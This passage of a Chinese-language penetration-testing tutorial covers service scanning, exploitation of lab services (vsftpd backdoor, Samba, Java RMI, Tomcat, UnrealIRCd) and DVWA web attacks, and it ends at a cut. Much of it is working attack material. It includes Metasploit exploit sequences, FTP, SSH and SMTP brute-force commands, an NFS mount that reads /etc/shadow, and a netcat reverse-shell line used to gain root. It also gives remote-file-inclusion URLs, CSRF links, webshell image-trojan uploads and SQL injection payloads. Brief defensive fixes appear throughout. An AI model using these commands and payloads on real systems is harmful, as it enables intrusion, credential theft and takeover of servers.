端口1024到49151，分配给用户进程或应用程序。这些进程主要是用户安装的程序。 端口Banner获取-nmap 使用Nmap扫描指定主机的端口信息，并返回Banner。nmap IP地址 -p 端口号 --script banner 端口Banner获取-dmitry 使用dmitry获取端口banner信息。dmitry -pb IP地址 端口Bannaer获取-netcat 使用netcat获取Banner信息：nc -nv IP地址 端口号 端口服务版本信息获取 利用Nmap获取目标系统的端口版本信息：nmap -p 端口号 -sV IP地址 操作系统版本信息获取 使用Nmap扫描指定主机的操作系统版本信息。nmap -O IP地址 在针对内容测试时，有授权的情况下，可以利用nmap对目标进行完整测试。nmap -A -v IP地址 第五阶段-漏洞扫描 漏洞扫描原理 漏洞扫描器对漏洞进行扫描，以验证具体目标是否存在对应的具体漏洞。但是也存在错误扫描，需要对扫描结果进行漏洞验证。 其实扫描器的原理大致相同都是通过发送对应的验证数据到目标具体服务进行验证。当收到目标返回的响应与存在漏洞的响应一致时，就表明存在漏洞。 漏洞扫描工具-nmap 使用nmap也可以进行漏洞扫描：nmap --script vuln 目标IP地址 漏洞扫描工具-nessus 使用Nessus进行漏洞扫描测试（系统、Web漏洞扫描） 漏洞利用metasploit 利用Metasploit对扫描到的漏洞加以利用 msfconsole #启动metasploit search vsftpd #查看vsftpd漏洞利用代码 Web应用程序漏洞扫描 针对Web应用程序的漏洞扫描其实就是每个扫描器读取自己的Payload进行探测。 Web漏洞扫描器：每个扫描器都有各自不同的Payload进行探测。（尽量使用2-3个以上扫描器进行扫描） Owasp-zap AWVS Appscan Nikto Burpsuite OWASP-ZAP漏洞扫描 OWASP-ZAP是OWASP组织开发的用于Web应用程序漏洞扫描器，免费开源，不断更新维护 nikto漏洞扫描 nikto -host IP地址对目标服务器进行漏洞扫描主要针对HTTP服务器。 第六阶段-漏洞利用 FTP漏洞利用 FTP协议介绍 文件传输协议（英文：File Transfer Protocol，缩写：FTP）是用于在网络上进行文件传输的一套标准协议，使用客户/服务器模式。它属于网络传输协议的应用层。FTP默认使用21号端口。 用户分类：1、Real用户 2、Administrator 3、Anonymous（匿名）用户 FTP文件传输格式：1、ASCII 2、二进制格式 利用FTP匿名登录漏洞 由于FTP没有禁止匿名用户，所以可以直接使用Anonymous用户直接登录FTP服务器。使用nc 连接FTP（USER anonymous；PASS 随便） 利用FTP后门漏洞 Vsftpd2.3.4漏洞：当进行FTP认证时，如果用户名USER中包含:)，那么直接就触发监听6200端口的连接（nc 192.168.31.72 6200）的shell。 FTP安全配置 修改配置文件，禁止匿名用户登录。（Linux FTP修改：/etc/vsftpd.conf 设置anonymous_enable=NO） 对特定漏洞进行打补丁，或者设置防火墙禁止连接后门端口。 iptables -A INPUT -p tcp -dport 6200 -j DROP iptabels -A OUTPUT -p tcp sport 6200 -j DROP FTP用户名密码暴力破解 使用hydra暴力破解FTP登录hydra -L user.txt -P passwd.txt ftp://192.168.31.52 FTP用户名明文密码验证 FTP协议中用于用户认证的过程中，客户端与服务器端是通过明文进行交互信息。验证FTP登录过程中明文传输用户名和密码。可用Wireshark抓取 FTP用户名明文密码嗅探 利用arpspoof进行ARP嗅探 （网关欺骗：arpspoof -i eth0 网关 -t 目标IP Tip：【arpspoof：未找到命令；解决方法 apt-get install dsniff ssldump】 利用Wireshark进行流量嗅探 FTP登录之后做的事情 利用metasploit创建反弹shell上传到FTP服务器。可以利用setookit快速生成反弹shell。 可参考：Metasploit实战：FTP漏洞利用 SSH漏洞利用 ubuntu搭建ssh服务端 ubuntu下安装服务端：sudo apt-get install openssh-server ssh服务端服务启动与关闭 启动、状态获取、关闭 service ssh start service ssh status service ssh stop ubuntu搭建ssh客户端（也可以使用XShell） ubuntu下安装putty工具：sudo apt-get instai putty-tools ubuntu下安装putty：在软件中心搜索putty进行安装 客户端连接服务端 nmap获取ssh Banner信息 nmap -sV -p 22 IP地址 Metasploit获取ssh Banner信息 msfconsole #启动metasploit use auxiliary/scanner/ssh/ssh_version msf auxiliary(ssh_version)>set rhosts IP地址 msf auxiliary(ssh version)>set rport 22 msf auxiliary(ssh_version)>exploit nc获取 ssh Banner信息 nc IP地址 22 配置ssh规避Banner信息 在ssh配置文件/etc/ssh/sshd_config中新增一行。DebianBanner no【然后重启ssh服务 service ssh restart】 Medusa SSH弱口令破解 如果在设置SSH服务时，管理员设置了容易被猜解出来的用户名和密码（弱口令）。那么测试人员就可以使用对应的密码工具进行暴力破解弱口令。破解出来就可以使用对应的用户名和密码登录系统。 medusa -h IP地址 -U user.txt -P passwd.txt -M ssh SSH命令行工具登录 一般情况下Linux下都具有ssh客户端，用来登录ssh服务端。可以使用 ssh 用户名@IP地址然后根据提示输入密码。 Metasploit利用SSH登录反弹Shell 使用Metasploit可以进行ssh登录（破解），会自动建立对应的Bash shell连接。 msfconsole #启动melasploit msf > use auxiliary/scanner/ssh/ssh_login msf > show options #查看需要设置的选项 msf > set rhosts IP地址 msf > set username 用户名 msf > set password 密码 msf > show options msf > run #运行 msf > sessions -l #查看当前连接的shell msf > sessions -i 1 #建立ID为1的bash shell Metasploit获取Meterpreter Shell 利用获得的Bash shell，注入Metasploit中Meterpreter payload从而获取更强大功能的shell。 msf > sessions -l #查看当前连接的shell msf > sessions -u 1 #利用ID为1的shell注入反弹meterpreter playload SSH安全防御——SSH 修改默认端口 默认情况下，SSH使用22端口。为了安全，一般情况下都会修改默认端口。【修改后必须重启SSH服务】 sudo gedit /etc/ssh/sshd_config service ssh restart SSH安全防御——SSH设置PGP登录 默认情况下，SSH使用用户名和密码进行远程登录。但也可以使用密钥对进行身份验证登录（公钥与私钥）。 生成SSH密钥对，使用puttygen。 下载链接：https://www.puttygen.com/download-putty 使用ssh-keygen命令在Linux生成.ssh目录，在.ssh下新建密钥存储文件authorized_keys，并复制私钥文件到.ssh目录下。使用命令puttygen -L “要拷贝的私钥文件名”，将内容拷贝到authorized_keys文件中。 使用Putty客户端加载私钥文件进行连接。 SSH安全防御——SSH防御暴力破解用户账号 在Linux下可以配置不能使用用户名和密码登录，只使用SSH PGP方式验证登录。以此规避SSH暴力破解。 sudo gedit /etc/ssh/sshd_config #PasswordAuthentication yes => PasswordAuthentication no service ssh restart 缺点：不能使用用户密码登录，很大程度上存在复杂操作。 SSH安全防御——Iptables设置阈值防止暴力破解 利用Iptables对多次连接验证错误，进行账户锁定120秒。 iptables -I INPUT -p tcp --dport 22 -i eth0 -m state --state NEW -m recent --set iptables -I INPUT -p tcp --dport 22 -i eth0 -m state --state NEW -m recent --update --seconds 120 --hitcount 3 -j DROP 在设置完之后，需要重新启动ssh服务。 Telnet漏洞利用 Telnet介绍 Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。 虽然Telnet较为简单实用也很方便，但是在格外注重安全的现代网络技术中，Telnet并不被重用。原因在于Telnet是一个明文传送协议，它将用户的所有内容，包括用户名和密码都明文在互联网上传送，具有一定的安全隐患、因此许多服务器都会选择禁用Telnet服务。如果我们要使用Telnet的远程登录，使用前应在远端服务器上检查并设置允许Telnet服务的功能。 Telnet服务端默认情况下使用23端口。 telnet版本获取 使用nmap获取telnet版本信息nmap -p23 -sV 192.168.31.72，或者使用metasploit获取对应版本信息use auxiliary/scanner/telnet/telnet_version telnet密码破解 使用metasploit下针对telnet破解的模块进行用户名和密码的破解。 在msfconsole下使用search telnet进行查询telnet可以利用的模块。 telnet登录测试 使用破解好的会话连接telnet，并执行对应命令。 使用sessions -l查看建立的会话；使用sessions -i id使用对应的会话。 telnet客户端连接telnet服务器 windows下开启telnet客户端，连接telnet服务端。 telnet明文密码传输 使用wireshark抓取telnet数据包。 msf登录telnet 在metasploit中使用telnet_login进行登录，并使用session -i id连接shell。 msf连接shell下载exp 使用wget进行下载。wget http://www.exploit-db.com/download/8572 【需将文件最后一行去掉，否则执行编译时会报错。】 设置kali nc监听 使用netcat 进行监听后期返回的shell。nc -lvp 4444 编译执行exp，获取root gcc 源文件名 -o exploit #将源文件进行编译并输出到exploit文件中 echo '#!/bin/sh' > /tmp/run #写入到/tmp/run文件中 echo '/bin/netcat -e /bin/sh IP地址 4444' >> /tmp/run ps aux | grep udev #显示一个root权限的进程 ./exploit 数字pid-1 #执行exploit,具有root权限的pid-1 SMTP漏洞利用 邮件发送与接受模型 邮件发送使用smtp协议，占用25端口。而邮件接收使用pop3或imap协议，分别占用110和143端口。 添加主机名和域名 为了在本地搭建好邮件服务器，所以需要修改对应内容。使得可以在本地进行域名解析。 sudo gedit /etc/hosts 127.0.0.1 mail.test.lab test sudo gedit /etc/hostname test 修改完成之后使用reboot进行重启，使得修改生效。 使用hostname 或hostname -f查看修改是否成功。 ubuntu 安装postfix 因为postfix是非常流行的smtp软件，所以ubuntu的主要库中集成了postfix，可以直接使用以下命令安装：sudo apt-get install postfix 修改配置文件：sudo gedit /etc/postfix/main.cf 追加子网信息 mynetworks = 127.0.0.0/8 192.168.1.0//24 inet_protocols = ipv4 home_maillbox = Maildir/ 修改完成之后重新启动服务postfix：sudo service postfix restart，然后使用netstat -nlv来查看对应25端口是否开启。 ubuntu安装dovecot sudo apt-get install dovecot-imapd dovecot-pop3d sudo gedit /etc/dovecot/conf.d/10-auth.conf disable_plaintest auth = yes auth_mechanisms = plain login sudo gedit /etc/dovecot/conf.d/10-mail.conf mail_location = maildir:/home/%u/Maildir sudo gedit /etc/dovecot/conf.d/10-master.conf 设置开启port = 143 port = 110 修改权限 sudo gedit /etc/dovecot/conf.d/10-master.conf unix_listerner auth-usrdb{ mode = 0600 user = postfix group = postfix } 重新启动dovecot服务sudo service dovecot restart使用netstat -nlv查看服务端口110、143是否开启 telnet测试用户名 telnet IP地址 端口 vrfy test@mail.test.lab metasploit测试用户名（字典内容为完整邮件名） 在metasploit中有smtp-enum可以对smtp上用户名进行枚举。 use auxiliary/scanner/smtp/smtp_enum msf auxiliary(smtp_enum) > set rhosts 192.168.1.107 msf auxiliary(smtp_enum) > set rport 25 msf auxiliary(smtp_enum) > set USER_FILE /root/Desktop/user.txt msf auxiliary(smtp_enum) > exploit smtp-user-enum测试用户名 smtp-user-enum专门用来进行smtp用户名枚举的工具。 smtp-user-enum -M VRFY -U /root/Desktop/user.txt -t 目标IP地址 ismtp测试用户名 ismtp -h IP地址:25 -e /root/Desktop/email.txt smtp版本信息获取 使用metasploit中的smtp-version模块探测smtp服务的版本信息。 medusa工具介绍 medusa是一款用来破解不同协议用户名和密码的专用软件。 smtp验证方式 参考链接：https://en.wikipedia.org/wiki/SMTP_Authentication medusa破解smtp medusa -h 目标IP地址 -u 用户名 -P 字典文件 -M 协议模块 rpcbind漏洞利用 rpcbind介绍 通俗的来说，rpcbind是NFS（网络文件系统Network File System）中用来进行消息通知的服务。 一般情况下rpcbind运行在111端口。并且NFS配置开启rpcbind_enable=\"YES\" 探测目标rpcbind 使用nmap -sV -p 111 IP地址探测目标rpcbind版本信息。 nmap脚本探测 在nmap中使用nmap -p 111 --script=rpcinfo 目标IP地址来探测目标的rpcinfo信息。 metasploit模块探测 使用metasploit下的auxiliary/scanner/misc/sunrpc_portmapper 进行目标探测。 Samba漏洞利用 Samba介绍 Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。一般运行在139、445端口。 探测目标Samba 使用nmap -sV -p 139,44 IP地址探测目标端口服务版本信息。 metasploit漏洞利用 在Metasploit中集成了利用samba usermap RCE的脚本。 exploit/mulit/samba/usermap_script set rhosts 192.168.43.235 show payloads set payload cmd/unix/reverse set lhost 192.168.43.80 exploit 防御修复 在Metasploit中show info可以查看漏洞信息。 修复方案：升级samba。 rlogin漏洞利用 rlogin介绍 远程登录（rlogin）是一个UNIX命令，它允许授权用户进入网络中的其它UNIX机器并且就像用户在现场操作一样。一旦进入主机，用户可以操作主机允许的任何事情。默认512、513端口 探测目标rlogin 使用 nmap -sV -p 512,513 IP地址探测目标login版本信息。 512用于对远程执行的进程进行验证、513反弹bash shell。 rlogin最高权限登录 使用 rlogin -l root IP地址使用root权限登录系统 防御修复 添加root登录验证密码。 关闭rlogin服务，改用ssh等来管理服务器。 反序列化远程命令执行漏洞 Java rmi介绍 Java RMI指的是远程方法调用（Remote Method Invocation）。它是一种机制，能够让在某个Java虚拟机上的对象调用另一个Java虚拟机中的对象上的方法。 RMI是J2SE的一部分，能够让程序员开发出基于JAVA的分布式应用。一个RMI对象是一个远程JAVA对象，可以从另一个JAVA虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地JAVA对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。 对于任何一个以对象为参数的RMI接口，你都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于class path中的可序列化类来反序列化。 RMI的传输100%基于反序列化。 默认端口1099 探测目标rmi 使用nmap -sV -p 1099 IP地址探测目标的版本信息。 rmi远程命令执行利用 使用Metasploit 对rmi RCE漏洞利用。 use exploit/multi/misc/java_rmi_server set rhosts 192.168.43.235 set lhost 192.168.43.80 show payloads set payloads java/meterpreter/reverse_tcp exploit sessions -l sessions -i 1 防御修复 存在反序列化传输。【特别注意是否会执行系统命令】 存在有缺陷的第三方库如commons-collections，及时升级库。 后门连接 后门连接探测 某些情况下，服务器可能已经存在某些后门。可以使用Nmap进行探测。nmap -sV 192.168.43.235 -p 某些端口 nc连接后门获取权限 nc 目标IP 端口号连接后门程序 NFS漏洞利用 NFS介绍 NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。默认2049端口 探测目标NFS nmap --script=nfs-* IP地址 探测NFS是否可以导出 使用showmount命令确是\"/\"共享（文件系统的根）是否正在导出。可能需要安装nfs-common包才能使用“showmount” apt-get install nfs-common showmount -e IP地址 查看导出内容 mkdir nfs_root mount -t nfs IP地址:/ ~/nfs_root -o nolock cat ~/nfs_root/etc/shadow #查看密码文件 proFTPD漏洞利用 proFTPD介绍 ProFTPD：一个Unix平台上或是类Unix平台上（如Linux，FreeBSD等）的FTP服务器程序http://www.proftpd.org/ 默认端口2121 探测目标proFTPD 使用nma -sV -p 2121 IP地址探测目标proftpd版本信息。 exploit-db搜索目标漏洞 在https://www.exploit-db.com/输入对应软件及版本搜索是否有漏洞。 msf暴力破解密码 使用metasploit下的auxiliary/scanner/tp/ftp_login 进行目标探测。 MySQL漏洞利用 MySQL介绍 MySQL是个关系型数据库管理系统，由瑞典MySQLAB公司开发，目前属于Oracle旗下产品。 MySQL是最流行的关系型数据库管理系统之一，在WEB应用方面，MySQL是最好的RDBMS（Relational Database Management System，关系数据库管理系统）应用软件。 MySQL是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。 官网：https://www.mysql.com/ 默认端口3306 探测目标mysql 使用nmap -sV -p 3306 IP地址探测目标mysql版本信息。 msf破解mysql密码 使用msf下的mysql_login模块破解mysql登录用户名和密码。 登录数据库查看数据 使用mysql -h IP地址 -u root登录数据库系统 postgresql漏洞利用 postgresql介绍 PostgreSQL是以加州大学伯克利分校计算机系开发的POSTGRES，现在已经更名为PostgreSQL，版本4.2为基础的对象关系型数据库管理系统（ORDBMS）。PostgreSQL支持大部分SQL标准并且提供了许多其他现代特性：复杂查询、外键、触发器、视图、事务完整性、MVCC。同样，PostgreSQL可以用许多方法扩展，比如，通过增加新的数据类型、函数、操作符、聚集函数、索引。免费使用、修改、和分发PostgreSQL，不管是私用、商用、还是学术研究使用。默认端口5432 https://www.postgresql.org/ 探测目标postgresql 使用nmap -sV -p 5432 IP地址探测目标postgresql版本信息。 msf暴力破解postgresql 在msf下使用postgresql_login模块破解系统登录用户名和密码。 登录数据库查看数据 利用pgadmin客户端软件登陆postgresql postgresql代码执行利用 利用msf下postgresql的代码执行获得反弹shell。use exploit/linux/postgres/postgres_payload 防御修复 防御：屏蔽任意IP连接Postgresql 修复：升级版本，安全配置 VNC漏洞利用 VNC介绍 VNC（Virtial Network Console）是虚拟网络控制台的缩写。它是一款优秀的远程控制工具软件，由著名的AT&T的欧洲研究实验室开发的。可视化控制，类似于远程桌面，默认vnc服务端运行在5900端口 探测目标vnc 使用nmap -sV -p 5900 IP地址探测目标vnc版本信息。 msf破解vnc密码 在msf下vnc_login模块可用来对vnc服务端认证用户名和密码进行破解。 vnc客户端登陆 windows下安装vnc viewer客户端软件连接VNC服务端。 IRC漏洞利用 IRC介绍 IRC是Internet Relay Chat的英文缩写，中文一般称为互联网中继聊天。它是由芬兰人Jarkko Oikarinen于1988年首创的一种网络聊天协议。经过十年的发展，目前世界上有超过60个国家提供了IRC的服务。IRC的工作原理非常简单，您只要在自己的PC上运行客户端软件，然后通过因特网以IRC协议连接到一台IRC服务器上即可。它的特点是速度非常之快，聊天时几乎没有延迟的现象，并且只占用很小的带宽资源。所有用户可以在一个被称为\"Channel”（频道）的地方就某一话题进行交谈或密谈。每个IRC的使用者都有一个Nickname（昵称）。 默认情况下，irc服务器运行在6667端口。 探测目标irc 使用nmap -sV -p 6667 IP地址探测目标irc版本信息。 msf利用irc后门 使用searchsploit查找可以利用的POC。 searchsploit irc版本 利用msf中对于irc后门连接的模块，连接shell。use exploit/unix/irc/unreal_ircd_3281_backdoor 防御修复 升级软件版本 更换其他软件 Tomcat漏洞利用 tomcat介绍 Tomcat服务器是一个免费的开放源代码的Web应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP程序的首选。默认情况下，8180端口是tomcat管理的HTTP端口。 探测目标tomcat 使用nmap -sV -p 8180 IP地址探测目标tomcat版本信息。 msf破解tomcat密码 msf下的auxiliary/scanner/http/tomcat_mgr_login 模块来对tomcat管理登陆密码进行破解。 msf利用tomcat管理 在msf下可以使用use exploit/multi/http/tomcat_mgr_deploy模块利用tomcat upload功能反弹shell。 第七阶段-DVWA 介绍 Web应用程序（DVWA）是一个PHP/MySQL Web应用程序。它的主要目标是帮助安全专业人员在合法环境中测试他们的技能和下具，帮助web开发人员更好地理解保护web应用程序的过程，并帮助教师/学生在教室环境中教授/学习web应用程序安全性。http://www.dvwa.co.uk/ 实验环境操作 默认情况下，DVWA系统登陆的用户admin，密码password 参考教程 https://www.freebuf.com/author/lonehand 切换难度操作 DVWA环境中可以通过DVWA Security难度按钮，切换不同的难度。 home介绍 DVWA的目的是实践一些最常见的Web漏洞，具有各种各样的困难级别。DVWA还包括一个Web应用防火墙（WAF），PHPID，它可以在任何阶段启用，以进一步增加难度。这将演示如何添加另一层安全性可以阻止某些意行为。注意，也有各种公共方法绕过这些保护（因此，这可以看作是对更高级用户的扩展）！在每个页而的底部都有一个帮助按钮，它可以让您查看该漏洞的提示和提示。还有更多的链接用于进一步的背景阅读，这涉及到安全问题。 Brute Force暴力破解 利用BurpSuite进行暴力破解 防御： 设置token机制，设置验证码 设置登录失败次数和锁定时间 过滤用户输入，防止SQL注入 Command Injection命令执行 Comimand Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。 Windows下执行下列命令： 执行ping 127.0.0.1 && ipconfig，依次执行两条命令 执行ping 127.0.0.1 || ipconfig，若第一条命令正确，则只执行第一条命令；若错误则执行下一条命令 执行ping 127.0.0.1 | ipconfig，只执行第二条命令 执行ping 127.0.0.1 ; ipconfig，Windows下\";\"为错误参数 防御： 过滤黑名单 替换、转义关键字 对于IP地址，可以用\".\"为分界，将所有数字拆分到数组，单个判断是否为数字is_numeric() CSRF跨站伪造请求攻击 CSRF介绍 CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。 CSRF-low级别漏洞利用 构造恶意链接：http://none.org.cn:81/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change# 当用户在当前cookie没有过期时，点击该链接完成用户密码修改 使用短链接伪装http://dwz.cn 当然，也可以在burp上构造poc，选中截断的内容，右键Engagement===>Generate CSRF poC CSRF-low级别漏洞高级利用 构造恶意页面，使用img标签隐藏真实目的 404 file not found. 用户使用浏览器访问该页面时，就会被修改。 注意：如果用户用A浏览器访问站点，又使用B浏览器访问恶意页面，不会触发漏洞。 CSRF-medium级别漏洞利用 过滤规则是http包头的Referer参数的值中必须包含服务器的主机名 这里可以将攻击页面命名为none.org.cn.html，然后通过链接跳转到此页面就可以绕过了 CSRF-high级别漏洞利用 High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。 只有获取token才能进行CSRF，但是浏览器存在同源策略，不能直接获取，所以比较难以利用。但是如果服务器存在存储XSS可以来获取token。然后构造url和代码进行CSRF利用。 一般情况下，在CSRF中使用token，可以防御大部分CSRF利用。 CSRF-impossible级别【防御】 Impossible级别的代码，加入了Anti-CSRF token机制，利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。 File Inclusion文件包含 文件包含漏洞介绍 文件包含：开发人员将相同的函数写入单独的文件中,需要使用某个函数时直接调用此文件,无需再次编写,这种文件调用的过程称文件包含。 File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。 文件包含漏洞通常配合文件上传来获取webshell 目录遍历与文件包含的区别：目录遍历是可以读取web目录以外的其他目录,根源在于对路径访问权限设置不严格，针对本系统。文件包含是利用函数来包含web目录以外的文件，分为本地包含和远程包含。 特征： ?page=a.php ?home=b.html ?file=content 检测： ?file=../../../../etc/passwd ?page=file:///etc/passwd ?home=main.cgi ?page=http://www.a.com/1.php http://1.1.1.1/../../../../dir/file.txt File Inclusion_low级别漏洞利用 构造远程url，page=http://恶意ip/shell.php这里shell.php的后缀名为任意的组合，比如.txt，都会被尝试执行php。如果shell中不是php内容，则会直接显示对应的内容。 File Inclusion_medium级别代码分析 使用了str_replace()函数将\"http://\",\"https://\",\"../\",\"..\\\"替换成空字符 File Inclusion_medium级别漏洞利用 使用str_replace函数是极其不安全的，因为可以使用大小写绕过或者是双写绕过替换规则。例如：page=hthttps://tps://none.org.cn/test.txt时，str_replace函数会将http://删除，于是剩余内容拼接成`page=https://none.org.cn/test.txt`，或用大小写绕过`page=Https://none.org.cn/test.txt`，成功执行远程命令。例如：`http://none.org.cn:81/vulnerabilities/fi/?page=..././..././..././etc/passwd` File Inclusion_high级别代码分析 分析源码，意思是在参数不为include.php时，且参数不以file开头，则报错；确保了$file是以file开头。于是，我们可以利用 file 协议包含本地文件进行绕过，然后配合文件上传漏洞进行利用。 File Inclusion_high级别漏洞利用 http://none.org.cn:81/vulnerabilities/fi/?page=file:///etc/passwd File Inclusion_impossible级别代码分析&【防御】 基于白名单进行防御，确保page参数传递的只能是固定的文件名。 File Upload文件上传 文件上传漏洞介绍 File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得可以通过上传webshell获取服务器权限，因此文件上传漏洞带来的危害常常是毁灭性的。 文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。 File Upload_low级别代码分析&漏洞利用 Your image was not uploaded.'; } else { // Yes! echo \"{$target_path} succesfully uploaded!\"; } } ?> basename(path,suffix) 函数，返回path中的文件名部分，如果可选参数suffix为空，则返回的文件名中包含后缀名，反之不包含后缀名。可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。 File Upload_medium级别代码分析 Your image was not uploaded.'; } else { // Yes! echo \"{$target_path} succesfully uploaded!\"; } } else { // Invalid file echo 'Your image was not uploaded. We can only accept JPEG or PNG images.'; } } ?> 可以看到，Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。 File Upload_medium级别漏洞利用 抓包修改文件类型，将shell文件的后缀改为png后上传以绕过限制，然后用burpsuite抓包将文件后缀改回php，然后用蚁剑连接即可。 配合文件包含进行利用，在shell文件头添加GIF98，后缀改为jpg然后上传即可，配合上文件包含漏洞http://none.org.cn:81/vulnerabilities/fi/?page=hTTp://none.org.cn:81/hackable/uploads/test2.jpg加上cookie后用蚁剑连接即可。 File Upload_high级别代码分析 Your image was not uploaded.'; } else { // Yes! echo \"{$target_path} succesfully uploaded!\"; } } else { // Invalid file echo 'Your image was not uploaded. We can only accept JPEG or PNG images.'; } } ?> getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。代码使得上传的后缀名只能是jpg、jpeg、png，否则上传失败。其中getimagesize用来检测文件头。 File Upload_high级别漏洞利用 在shell文件头添加GIF98以绕过文件头检测，后缀改为jpg然后上传即可，接着利用文件包含漏洞http://none.org.cn:81/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/test3.jpg加上cookie后用蚁剑连接即可。 利用图片马绕过，cmd输入copy 5.jpg /b + test3.txt /a shell.jpg得到shell.jpg然后上传，接着利用文件包含漏洞http://none.org.cn:81/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/shell.jpg加上cookie后用蚁剑连接即可。 copy 5.jpg /b + test3.txt /a shell.jpg 使用CMD制作一句话图片马。 参数/b指定以二进制格式复制、合并文件，用于图像类/声音类文件 参数/a指定以ASCII格式复制、合并文件，用于txt等文档类文件 File Upload_impossible级别代码分析&【防御】 取文件最后的扩展名。 $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 对上传文件进行重命名（为md5值，使得%00截断无法绕过过滤规则）。 $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 采取白名单方式验证文件的后缀名，MIME-TYPE类型，以及文件大小。以及检查是否为真正图片。 if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) && ( $uploaded_size GD库或image-magick进行二次渲染，洗掉图片中的恶意代码。 $img = imagecreatefrompng( $uploaded_tmp ); 采用相对路径回显到前端页面。 if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) 加入Anti-CSRF token防护CSRF攻击。 checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); ${target_file} succesfully uploaded!\"; } else { // No echo 'Your image was not uploaded.'; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo 'Your image was not uploaded. We can only accept JPEG or PNG images.'; } } // Generate Anti-CSRF token generateSessionToken(); ?> SQL Injection注入 SQL注入介绍 SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 形成SQL注入漏洞的原因： 用户输入不可控 输入内容被带入SQL语句执行 字符型注入or数字型注入判断 当输入的参数为字符串时，并且存在注入，可称为字符型注入，字符型和数值型的区别在于数值不需要单引号闭合，而字符型都需要单引号闭合。 例如： 字符型：select * from news where user='admin'; 数字型：select * from news where id=1; 以上可以看出，在构造payload的时，若注入1'报错，1' #不报错，则为字符型注入；若两个都报错则为数字型注入。（在符号未被转义的情况下，可以通过此方法简单判断） SQL注入可以使用自动化的注入神器sqlmap进行自动化注入，下面只是简要介绍手工注入，具体内容可以查看freebuf教程。 SQL Injection_low级别代码分析 ' . mysql_error() . '' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i ID: {$id}First name: {$first}Surname: {$last}\"; // Increase loop count $i++; } mysql_close(); } ?> 可以看到，Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。 SQL Injection_low级别漏洞利用 直接注入：' or 1=1 #，可以看到返回了多个结果，说明存在字符型注入。 SQL Injection_medium级别代码分析 ' . mysql_error() . '' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i ID: {$id}First name: {$first}Surname: {$last}\"; // Increase loop count $i++; } //mysql_close(); } ?> 可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号\\x00，\\n，\\r，\\，'，\"，\\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。 SQL Injection_medium级别漏洞利用 虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。 抓包更改参数' or 1=1 #时报错，改为1 or 1=1 #，查询成功，说明存在数字型注入。 针对这里的特殊符号转义，单引号被转义变成了\\'，但是可以将参数转换为16进制进行绕过。例如：table_name='users'变成table_name=0x7573657273 SQL Injection_high级别代码分析 Something went wrong.' ); // Get results $num = 